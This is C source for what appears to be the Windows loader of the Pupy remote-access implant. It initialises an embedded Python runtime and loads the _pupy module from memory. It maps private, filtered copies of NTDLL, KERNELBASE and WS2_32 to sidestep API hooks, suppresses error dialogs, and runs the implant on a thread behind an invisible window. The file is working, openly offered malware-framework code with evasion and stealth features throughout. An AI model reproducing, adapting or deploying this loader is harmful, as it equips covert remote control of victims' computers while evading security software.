/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <windows.h>
#include <signal.h>

#include "revision.h"
#include "pupy_load.h"
#include "debug.h"

#include "Python-dynload.c"

#ifdef POSTMORTEM
#include "postmortem.h"
#include "postmortem.c"
#endif

#ifdef _PUPY_DYNLOAD
#ifdef DEBUG
#include "_pupy_debug_pyd.c"
#define _pupy_pyd_c_start _pupy_debug_pyd_c_start
#define _pupy_pyd_c_size _pupy_debug_pyd_c_size
#else
#include "_pupy_pyd.c"
#endif
#endif

#define WINDOW_CLASS_NAME "DummyWindowClass"

static on_exit_session_t on_exit_session_cb = NULL;
static BOOL on_exit_session_called = FALSE;

typedef LPWSTR* (*CommandLineToArgvW_t)(
    LPCWSTR lpCmdLine,
    int     *pNumArgs
);

typedef VOID (*__p_set_abort_behavior_t)(DWORD, DWORD);
typedef VOID (__cdecl *signal_t) (
    int sig,
    void (__cdecl *func ) (int)
);


#ifdef DEBUG
// Redirect early stdout to some file
static
void redirect_stdout() {
    FILE* new_log;
    char tmpdir[MAX_PATH];
    char tmp[MAX_PATH];

    dprint("Redirect stdout requested\n");

    if (!GetTempPathA(sizeof(tmpdir), tmpdir))
        return;

    dprint("Redirect stdout, tmpdir: %s\n", tmpdir);

    if (!GetTempFileNameA(
            tmpdir,
            "pup",
            0,
            tmp))
        return;

    set_debug_log(tmp);
}
#endif


// https://stackoverflow.com/questions/291424/
static
LPSTR* CommandLineToArgvA(INT *pNumArgs)
{
    LPWSTR cmdline;
    LPWSTR* args;
    LPSTR* result;
    LPSTR buffer;

    int retval;
    int numArgs;
    int storage;
    int bufLen;
    int i;

    static CommandLineToArgvW_t CommandLineToArgvW_ = NULL;

    if (!CommandLineToArgvW_) {
        HMODULE hShell32 = LoadLibrary("SHELL32.DLL");
        CommandLineToArgvW_ = (CommandLineToArgvW_t) GetProcAddress(
            hShell32, "CommandLineToArgvW");
        dprint("CommandLineToArgvW: %p\n", CommandLineToArgvW_);
    }

    if (!CommandLineToArgvW_) {
        dprint("Failed to load CommandLineToArgvW from SHELL32.DLL\n");
        *pNumArgs = 0;
        return NULL;
    }

    numArgs = 0;

    cmdline = GetCommandLineW();
    if (!cmdline) {
        dprint("Command line not found");
        *pNumArgs = 0;
        return NULL;
    }

    args = CommandLineToArgvW_(cmdline, &numArgs);
    if (args == NULL) {
        *pNumArgs = 0;
        return NULL;
    }

    storage = numArgs * sizeof(LPSTR);
    for (i = 0; i < numArgs; ++ i)
    {
        retval = WideCharToMultiByte(
            CP_UTF8, 0, args[i], -1, NULL,
            0, NULL, NULL
        );
        if (!SUCCEEDED(retval))
        {
            LocalFree(args);
            *pNumArgs = 0;
            return NULL;
        }

        storage += retval;
    }

    result = (LPSTR*)LocalAlloc(LMEM_FIXED, storage);
    if (result == NULL)
    {
        LocalFree(args);
        *pNumArgs = 0;
        return NULL;
    }

    bufLen = storage - (numArgs * sizeof(LPSTR));
    buffer = ((LPSTR)result) + (numArgs * sizeof(LPSTR));
    for (i = 0; i < numArgs; ++ i)
    {
        if (bufLen < 0) {
            dprint("Buflen exhaused, arg %d (%d/%d)\n", i, bufLen, storage);
            numArgs = i;
            break;
        }

        retval = WideCharToMultiByte(
            CP_UTF8, 0, args[i], -1, buffer,
            bufLen, NULL, NULL
        );

        if (!SUCCEEDED(retval))
        {
            LocalFree(result);
            LocalFree(args);
            *pNumArgs = i;
            return NULL;
        }

        result[i] = buffer;

        buffer += retval;
        bufLen -= retval;
    }

    LocalFree(args);

    *pNumArgs = numArgs;
    return result;
}

#ifdef _PUPY_PRIVATE_NT
typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

static const PSTR NtDllAllowedPrefixes[] = {
    "Nt", "RtlAdjust", "RtlAllocate", "RtlConnect",
    NULL
};
static const PSTR Kernel32AllowedPrefixes[] = {
    "Open", "CreateRemote", "CreateFile",
    "Write", "Read", "Terminate", "Resume", "Virtual",
    "Reg", NULL
};
#endif

static
LONG WINAPI OnThreadCrash(PVOID ExceptionInfo) {

#ifdef POSTMORTEM
    LONG lVerdict = Postmortem(ExceptionInfo);
#else
    LONG lVerdict = 0;
#endif

    if (on_exit_session_cb && !on_exit_session_called) {
        dprint("Try to notify about client death\n");

        on_exit_session_called = TRUE;
        on_exit_session_cb();

        dprint("Try to notify about client death - done\n");
    }

    if (ExceptionInfo == NULL) {
        dprint("Non-Exception crash. Terminate process\n");
        TerminateProcess(GetCurrentProcess(), 0);
    }

    return lVerdict;
}

void OnAbortHandler(int signum)
{
    dprint("Get abort() exception!\n");
    OnThreadCrash(NULL);
}

void initialize(BOOL isDll) {
    int i, argc = 0;
    char **argv = NULL;
    char *oldcontext;

#ifdef _PUPY_DYNLOAD
    _pupy_pyd_args_t args;
#endif

#ifdef _PUPY_PRIVATE_NT
    HMODULE hNtDll = GetModuleHandleA("NTDLL.DLL");
    HMODULE hKernelBase = GetModuleHandleA("KERNELBASE.DLL");
    HMODULE hKernel32 = GetModuleHandleA("KERNEL32.DLL");
#ifdef _PUPY_PRIVATE_WS2_32
    HMODULE hWs2_32 = LoadLibraryA("WS2_32.DLL");
#endif

#ifdef WIN_X64
    BOOL blIsWow64 = FALSE;
#else
    BOOL blIsWow64 = TRUE;
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(
        hKernel32, "IsWow64Process");

    if (fnIsWow64Process)
        fnIsWow64Process(GetCurrentProcess(),&blIsWow64);
#endif

    if (!blIsWow64 && hNtDll && hKernel32 && hKernelBase)  {
        HMODULE hPrivate;
        dprint("Loading private copy of NTDLL/KERNELBASE\n");

        hPrivate = MyLoadLibraryEx(
            "NTDLL.DLL", hNtDll, NULL, NtDllAllowedPrefixes,
            MEMORY_LOAD_FROM_HMODULE | MEMORY_LOAD_EXPORT_FILTER_PREFIX
        );

        if (hPrivate) {
            dprint(
                "Private copy of NTDLL.DLL loaded to %p (orig: %p)\n",
                hPrivate, hNtDll
            );

            hPrivate = MyLoadLibraryEx(
                "KERNEL32.DLL", hKernelBase, hKernel32,
                Kernel32AllowedPrefixes,
                MEMORY_LOAD_FROM_HMODULE | MEMORY_LOAD_ALIASED | \
                    MEMORY_LOAD_EXPORT_FILTER_PREFIX | \
                    MEMORY_LOAD_NO_EP
            );

            if (hPrivate) {
                dprint(
                    "Private copy of KERNELBASE.DLL loaded to %p as KERNEL32 (orig: %p)\n",
                    hPrivate, hKernel32
                );
            } else {
                dprint("PRIVATE LOAD OF KERNEL32 FAILED\n");
            }

#ifdef _PUPY_PRIVATE_WS2_32
            hPrivate = MyLoadLibraryEx(
                "WS2_32.DLL", hWs2_32, NULL, NULL, MEMORY_LOAD_FROM_HMODULE
            );

            if (hPrivate) {
                dprint(
                    "Private copy of WS2_32.DLL loaded to %p (orig %p)\n",
                    hPrivate, hWs2_32
                );
                FreeLibrary(hWs2_32);
            } else {
                dprint("PRIVATE LOAD OF WS2_32 FAILED\n");
            }
#endif
        }
    }
#endif

    dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);

#ifdef DEBUG
    redirect_stdout();
#endif

    dprint("Parsing command line..\n");
    argv = CommandLineToArgvA(&argc);

    for (i=0; i<argc; i++) {
        dprint("ARGV: %d: %s\n", i, argv[i]);
    }

    dprint("Initializing python...\n");
    if (!initialize_python(argc, argv, isDll)) {
        return;
    }

    {
        DWORD dwOldErrorMode = SetErrorMode(
            SEM_FAILCRITICALERRORS |
                SEM_NOGPFAULTERRORBOX |
                SEM_NOALIGNMENTFAULTEXCEPT |
                SEM_NOGPFAULTERRORBOX |
                SEM_NOOPENFILEERRORBOX
        );

        dprint("Old error mode: %08x\n", dwOldErrorMode);
    }

    signal(SIGABRT, OnAbortHandler);

    _set_abort_behavior(0, _WRITE_ABORT_MSG);

    /*
    {
        HMODULE hMSVCR90 = MyGetModuleHandleA("MSVCR90");
        if (hMSVCR90) {
            __p_set_abort_behavior_t __p_set_abort_behavior = (__p_set_abort_behavior_t)
                MyGetProcAddress(hMSVCR90, "_set_abort_behavior");

            signal_t __p_signal = (signal_t) MyGetProcAddress(hMSVCR90, "signal");

            if (__p_set_abort_behavior) {
                __p_set_abort_behavior(0, _WRITE_ABORT_MSG);
                dprint("_set_abort_behavior/MSVCR90 - default abort() handlers removed\n");
            } else {
                dprint("_set_abort_behavior/MSVCR90 - _set_abort_behavior was not found\n");
            }

            if (__p_signal) {
                __p_signal(SIGABRT, OnAbortHandler);
                dprint("signal/MSVCR90 - set sigabrt handler\n");
            } else {
                dprint("signal/MSVCR90 - signal was not found\n");
            }
        } else {
            dprint("_set_abort_behavior/MSVCR90 - DLL was not loaded\n");
        }
    }
    */

#ifdef POSTMORTEM
    EnableCrashingOnCrashes();

    if (isDll) {
        dprint("Postmortem - enable per-thread handlers\n");
        MySetUnhandledExceptionFilter(NULL, OnThreadCrash);
    } else {
        dprint("Postmortem - set global handler\n");
        SetUnhandledExceptionFilter(OnThreadCrash);
    }
#endif

#ifdef _PUPY_DYNLOAD
    dprint("_pupy built with dynload\n");

    args.pvMemoryLibraries = MyGetLibraries();
    args.cbExit = NULL;
    args.blInitialized = FALSE;

    dprint("Load _pupy\n");
    HMODULE pupyhMod = xz_dynload(
        "_pupy.pyd",
        _pupy_pyd_c_start, _pupy_pyd_c_size,
        &args
    );

    if (args.blInitialized != TRUE) {
        dprint("_pupy.pyd initialization failed\n");
        return;
    }

    typedef FARPROC (*PyInit__pupyT)(void);
    PyInit__pupyT PyInit__pupy;
    PyInit__pupy = (PyInit__pupyT)MyGetProcAddress(pupyhMod, "PyInit__pupy");

    oldcontext = _Py_PackageContext;
    _Py_PackageContext = "_pupy";
    PyObject *m = PyInit__pupy();
    _Py_PackageContext = oldcontext;
    
    
    PyObject *modules = NULL;
    modules = PyImport_GetModuleDict();
    PyObject *name = PyUnicode_FromString("_pupy");
    _PyImport_FixupExtensionObject(m, name, name, modules);

    Py_DECREF(name);
    

    dprint("cbExit: %p\n", args.cbExit);
    dprint("pvMemoryLibraries: %p\n", args.pvMemoryLibraries);

    on_exit_session_cb = args.cbExit;

#else
    PyInit_pupy();
#endif

    return;
}

void deinitialize() {
    deinitialize_python();
}

LRESULT CALLBACK WinProc (HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    BOOL blExit = FALSE;

    switch (msg) {
    case WM_QUERYENDSESSION:
        switch (lParam) {
            case ENDSESSION_CLOSEAPP:
                dprint("WinProc: WM_QUERYENDSESSION/ENDSESSION_CLOSEAPP\n");
                break;
            case ENDSESSION_CRITICAL:
                dprint("WinProc: WM_QUERYENDSESSION/ENDSESSION_CRITICAL\n");
                break;
            case ENDSESSION_LOGOFF:
                dprint("WinProc: WM_QUERYENDSESSION/ENDSESSION_LOGOFF\n");
                break;
        }
        break;

    case WM_ENDSESSION:
        blExit = TRUE;
        dprint("WinProc: WM_ENDSESSION\n");
        break;
    case WM_CLOSE:
        blExit = TRUE;
        dprint("WinProc: WM_CLOSE\n");
        break;
    case WM_QUIT:
        blExit = TRUE;
        dprint("WinProc: WM_QUIT\n");
        break;

    default:
        return DefWindowProc (hwnd, msg, wParam, lParam);
    }

    if (blExit) {
        dprint("WinProc: Get Exit message. Current handler: %p\n", on_exit_session_cb);
        if (on_exit_session_cb && !on_exit_session_called) {
            on_exit_session_called = TRUE;
            on_exit_session_cb();
            dprint("WinProc: callback called\n");
        }
    }

    return FALSE;
}

#ifdef POSTMORTEM
static LONG PostmortemFilter(int code, PEXCEPTION_POINTERS pExceptionInfo) {
    LPTOP_LEVEL_EXCEPTION_FILTER lpLocalFilter = MyGetUnhandledExceptionFilter();
    dprint("PostmortemFilter: Exception code %d; Info: %p\n", code, pExceptionInfo);

    if (lpLocalFilter) {
        dprint("Using local postmortem filter\n");
        lpLocalFilter(pExceptionInfo);
        return EXCEPTION_CONTINUE_SEARCH;
    } else {
        dprint("Using global postmortem filter\n");
        return Postmortem(pExceptionInfo);
    }
}
#endif

DWORD WINAPI _run_pupy_thread(LPVOID lpArg)
{
#ifdef POSTMORTEM
    __try {
        dprint("Pupy worker started [Postmortem enabled]\n");
        run_pupy();
    }
    __except(PostmortemFilter(GetExceptionCode(), GetExceptionInformation())) {
        dprint("Fatal error at main thread\n");
    }
#else
    dprint("Pupy worker started [Postmortem disabled]\n");
    run_pupy();
#endif
    dprint("Pupy worker exited\n");
    return 0;
}

DWORD WINAPI execute(LPVOID lpArg)
{
    DWORD dwExitCode = -1;
    MSG msg;
    BOOL bRet;
    WNDCLASS wc;
    HWND hwndMain;
    HINSTANCE hinst;
    HANDLE hThread;
    DWORD threadId;
    DWORD dwWake;
    WNDCLASSEX wx;

    dprint("Running pupy...\n");

    ZeroMemory(&wx, sizeof(WNDCLASSEX));

    wx.cbSize = sizeof(WNDCLASSEX);
    wx.lpfnWndProc = WinProc;
    wx.style = CS_GLOBALCLASS;
    wx.lpszClassName = WINDOW_CLASS_NAME;

    if ( ! RegisterClassEx(&wx) ) {
        dprint("RegisterClassEx failed: %d\n", GetLastError());
        goto lbExit;
    }

    hwndMain = CreateWindowEx(
         0,
         WINDOW_CLASS_NAME,
         NULL,
         0, 0, 0, 0, 0,
         NULL, NULL, NULL, NULL
    );

    if (!hwndMain) {
        dprint("CreateWindowEx failed: %d\n", GetLastError());
        goto lbUnregisterClass;
    }

    hThread = CreateThread(
        NULL,
        0,
        _run_pupy_thread,
        NULL,
        0,
        &threadId
    );

    if (!hThread) {
        dprint("CreateThread failed: %d\n", GetLastError());
        dwExitCode = -GetLastError();
        goto lbDestroyWindow;
    }

    for (;;) {
        dwWake = MsgWaitForMultipleObjects(
            1,
            &hThread,
            FALSE,
            INFINITE,
            QS_ALLINPUT
        );

        switch (dwWake) {
        case WAIT_FAILED:
            dwExitCode = -3;
            goto lbDestroyWindow;

        case WAIT_TIMEOUT:
            continue;

        case WAIT_OBJECT_0:
            dwExitCode = 0;
            goto lbDestroyWindow;

        case WAIT_OBJECT_0 + 1:
            while (PeekMessage( &msg, NULL, 0, 0, PM_REMOVE)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            break;
        }
    }

lbDestroyWindow:
    DestroyWindow(hwndMain);

lbUnregisterClass:
    if (UnregisterClassA(WINDOW_CLASS_NAME, NULL) == FALSE) {
        dprint("UnregisterClass failed: dwLastError=%d\n", GetLastError());
    }

lbExit:
    return dwExitCode;
}
